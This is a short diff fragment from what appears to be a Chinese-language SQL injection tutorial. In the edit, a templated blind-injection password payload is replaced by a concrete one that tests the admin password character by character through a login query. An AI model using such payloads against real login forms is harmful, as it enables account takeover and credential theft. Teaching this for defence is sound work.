@@ -77,7 +77,7 @@ SELECT * FROM Users WHERE username = '輸入的username' AND password = '' UNION
 
 首先設計密碼為:
 ```sql
-g' OR substr((SELECT password FROM Users WHERE username='admin'), {num}, 1)='{trychar}' --
+g' OR substr((SELECT password FROM Users WHERE username='admin'), 1, 1)='B' --
 ```
 登入的SQL變成底下這樣
 ```sql
